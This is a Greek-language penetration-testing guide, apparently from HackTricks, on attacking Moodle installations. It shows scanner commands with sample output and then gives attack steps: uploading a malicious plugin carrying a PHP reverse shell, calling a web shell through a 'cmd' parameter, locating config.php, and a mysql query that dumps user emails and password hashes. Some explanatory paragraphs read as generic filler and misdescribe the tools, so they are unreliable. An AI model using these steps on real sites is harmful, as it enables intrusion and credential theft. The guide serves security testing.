# Moodle

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Αν ενδιαφέρεστε για μια **καριέρα στο χάκινγκ** και να χακεύετε το αχακέυτο - **προσλαμβάνουμε!** (_απαιτείται άπταιστη γραπτή και προφορική γνώση της πολωνικής γλώσσας_).

{% embed url="https://www.stmcyber.com/careers" %}

## Αυτόματες Σάρωσεις

### droopescan
```bash
pip3 install droopescan
droopescan scan moodle -u http://moodle.example.com/<moodle_path>/

[+] Plugins found:
forum http://moodle.schooled.htb/moodle/mod/forum/
http://moodle.schooled.htb/moodle/mod/forum/upgrade.txt
http://moodle.schooled.htb/moodle/mod/forum/version.php

[+] No themes found.

[+] Possible version(s):
3.10.0-beta

[+] Possible interesting urls found:
Static readme file. - http://moodle.schooled.htb/moodle/README.txt
Admin panel - http://moodle.schooled.htb/moodle/login/

[+] Scan finished (0:00:05.643539 elapsed)
```
### moodlescan

Το `moodlescan` είναι ένα εργαλείο που χρησιμοποιείται για την ανίχνευση ευπάθειών σε εγκαταστάσεις Moodle. Αυτό το εργαλείο εκτελεί αυτόματα διάφορα τεστ ασφαλείας για να εντοπίσει πιθανές ευπάθειες και αδυναμίες στην εγκατάσταση Moodle.

Για να χρησιμοποιήσετε το `moodlescan`, ακολουθήστε τα παρακάτω βήματα:

1. Κατεβάστε το `moodlescan` από το αποθετήριο του στο GitHub.
2. Εγκαταστήστε τις απαιτούμενες εξαρτήσεις.
3. Εκτελέστε το `moodlescan` και παρέχετε τη διεύθυνση URL της εγκατάστασης Moodle που θέλετε να ελέγξετε.

Το `moodlescan` θα εκτελέσει αυτόματα διάφορα τεστ ασφαλείας, όπως ελέγχους ευπάθειας SQL, ελέγχους ευπάθειας XSS και ελέγχους ευπάθειας CSRF. Το αποτέλεσμα των ελέγχων θα εμφανιστεί στην οθόνη και θα σας ενημερώσει για τυχόν ευπάθειες που εντοπίστηκαν.

Το `moodlescan` είναι ένα χρήσιμο εργαλείο για την ασφαλή αξιολόγηση της ασφάλειας των εγκαταστάσεων Moodle και την εντοπισμό πιθανών ευπαθειών. Χρησιμοποιήστε το για να βελτιώσετε την ασφάλεια του Moodle σας και να προστατεύσετε τα δεδομένα σας.
```bash
#Install from https://github.com/inc0d3/moodlescan
python3 moodlescan.py -k -u http://moodle.example.com/<moodle_path>/

Version 0.7 - Dic/2020
.............................................................................................................

By Victor Herrera - supported by www.incode.cl

.............................................................................................................

Getting server information http://moodle.schooled.htb/moodle/ ...

server         	: Apache/2.4.46 (FreeBSD) PHP/7.4.15
x-powered-by   	: PHP/7.4.15
x-frame-options	: sameorigin
last-modified  	: Wed, 07 Apr 2021 21:33:41 GMT

Getting moodle version...

Version found via /admin/tool/lp/tests/behat/course_competencies.feature : Moodle v3.9.0-beta

Searching vulnerabilities...


Vulnerabilities found: 0

Scan completed.
```
### CMSMap

Το CMSMap είναι ένα εργαλείο που χρησιμοποιείται για την εντοπισμό και την εκμετάλλευση ευπάθειών σε συστήματα διαχείρισης περιεχομένου (CMS). Αυτό το εργαλείο μπορεί να χρησιμοποιηθεί για να ελέγξει την ασφάλεια των ιστοσελίδων που χρησιμοποιούν δημοφιλή CMS όπως το Moodle.

Με το CMSMap, μπορείτε να εκτελέσετε διάφορες επιθέσεις, όπως εντοπισμός ευπάθειών, εκμετάλλευση ευπάθειών, ανάκτηση πληροφοριών και πρόσβαση σε αρχεία. Το εργαλείο υποστηρίζει πολλά CMS, συμπεριλαμβανομένου του Moodle, και παρέχει λεπτομερείς πληροφορίες για τις ευπάθειες που εντοπίζονται.

Για να χρησιμοποιήσετε το CMSMap, ακολουθήστε τα παρακάτω βήματα:

1. Κατεβάστε και εγκαταστήστε το CMSMap στο σύστημά σας.
2. Εκτελέστε το εργαλείο και επιλέξτε τον στόχο που θέλετε να ελέγξετε.
3. Επιλέξτε το CMS που χρησιμοποιεί ο στόχος.
4. Εκτελέστε τις επιθέσεις που επιθυμείτε, όπως εντοπισμός ευπάθειών ή εκμετάλλευση ευπάθειών.
5. Αναλύστε τα αποτελέσματα και εξετάστε τις ευπάθειες που εντοπίστηκαν.

Το CMSMap είναι ένα ισχυρό εργαλείο για την αξιολόγηση της ασφάλειας των ιστοσελίδων που χρησιμοποιούν δημοφιλή CMS όπως το Moodle. Χρησιμοποιήστε το με προσοχή και μόνο για νόμιμους σκοπούς.
```bash
pip3 install git+https://github.com/dionach/CMSmap.git
cmsmap http://moodle.example.com/<moodle_path>
```
### CVEs

Βρήκα ότι τα αυτόματα εργαλεία είναι αρκετά **άχρηστα στο να βρουν ευπάθειες που επηρεάζουν την έκδοση moodle**. Μπορείτε να τις **ελέγξετε** στο [**https://snyk.io/vuln/composer:moodle%2Fmoodle**](https://snyk.io/vuln/composer:moodle%2Fmoodle)

## **RCE**

Χρειάζεστε να έχετε ρόλο **manager** και μπορείτε να **εγκαταστήσετε πρόσθετα** μέσα στην καρτέλα **"Διαχείριση ιστότοπου"**\*\*:\*\*

![](<../../.gitbook/assets/image (447).png>)

Αν είστε manager, ενδέχεται να χρειαστεί να **ενεργοποιήσετε αυτήν την επιλογή**. Μπορείτε να δείτε πώς στο PoC για την ανέλιξη προνομίων του moodle: [https://github.com/HoangKien1020/CVE-2020-14321](https://github.com/HoangKien1020/CVE-2020-14321).

Στη συνέχεια, μπορείτε να **εγκαταστήσετε το παρακάτω πρόσθετο** που περιέχει τον κλασικό pentest-monkey php r**ev shell** (_πριν το ανεβάσετε, πρέπει να το αποσυμπιέσετε, να αλλάξετε την IP και τη θύρα του revshell και να το συμπιέσετε ξανά_)

{% file src="../../.gitbook/assets/moodle-rce-plugin.zip" %}

Ή μπορείτε να χρησιμοποιήσετε το πρόσθετο από το [https://github.com/HoangKien1020/Moodle\_RCE](https://github.com/HoangKien1020/Moodle\_RCE) για να λάβετε ένα κανονικό PHP shell με την παράμετρο "cmd".

Για να αποκτήσετε πρόσβαση και να εκτελέσετε το κακόβουλο πρόσθετο, πρέπει να αποκτήσετε πρόσβαση στο:
```bash
http://domain.com/<moodle_path>/blocks/rce/lang/en/block_rce.php?cmd=id
```
## POST

### Εύρεση διαπιστευτηρίων βάσης δεδομένων

Για να βρούμε τα διαπιστευτήρια της βάσης δεδομένων, μπορούμε να εκμεταλλευτούμε τις ευπάθειες του Moodle. Μια συνηθισμένη ευπάθεια είναι η διαρροή πληροφοριών που συμβαίνει όταν ο Moodle αποθηκεύει τα διαπιστευτήρια της βάσης δεδομένων σε αρχεία καταγραφής ή σε αρχεία ρυθμίσεων που δεν προστατεύονται σωστά.

Για να εκμεταλλευτούμε αυτήν την ευπάθεια, μπορούμε να αναζητήσουμε τα αρχεία καταγραφής του Moodle ή τα αρχεία ρυθμίσεων που περιέχουν τα διαπιστευτήρια της βάσης δεδομένων. Μπορούμε να χρησιμοποιήσουμε την εντολή `grep` για να αναζητήσουμε συγκεκριμένα μοτίβα, όπως το "db_user" ή το "db_password", στα αρχεία του Moodle.

Εάν βρούμε τα διαπιστευτήρια της βάσης δεδομένων, μπορούμε να χρησιμοποιήσουμε αυτές τις πληροφορίες για να αποκτήσουμε πρόσβαση στη βάση δεδομένων και να εξερευνήσουμε περαιτέρω το σύστημα Moodle.
```bash
find / -name "config.php" 2>/dev/null | grep "moodle/config.php"
```
### Αποκτήστε τα διαπιστευτήρια από τη βάση δεδομένων

Για να αποκτήσετε τα διαπιστευτήρια από μια βάση δεδομένων, μπορείτε να ακολουθήσετε τα παρακάτω βήματα:

1. Εντοπίστε τη βάση δεδομένων που περιέχει τα διαπιστευτήρια που σας ενδιαφέρουν.
2. Χρησιμοποιήστε μια ευπάθεια ή μια εκμετάλλευση για να αποκτήσετε πρόσβαση στη βάση δεδομένων.
3. Αναζητήστε τους πίνακες που περιέχουν τα διαπιστευτήρια χρηστών.
4. Εξαγάγετε τα δεδομένα από τους πίνακες που περιέχουν τα διαπιστευτήρια.
5. Αναλύστε τα δεδομένα για να εντοπίσετε τα διαπιστευτήρια που σας ενδιαφέρουν.

Προσέξτε να τηρήσετε τους νόμους και τους κανονισμούς που διέπουν την εκμετάλλευση ευπαθειών και την πρόσβαση σε δεδομένα. Η παραβίαση της ιδιωτικότητας και η παράνομη πρόσβαση σε δεδομένα είναι ποινικά αδικήματα.
```bash
/usr/local/bin/mysql -u <username> --password=<password> -e "use moodle; select email,username,password from mdl_user; exit"
```
<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Εάν ενδιαφέρεστε για μια **καριέρα στο χάκινγκ** και θέλετε να χακεύσετε το αχακέυτο - **προσλαμβάνουμε!** (_απαιτείται άριστη γνώση γραπτού και προφορικού Πολωνικού_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>Μάθετε χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΠΑΚΕΤΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
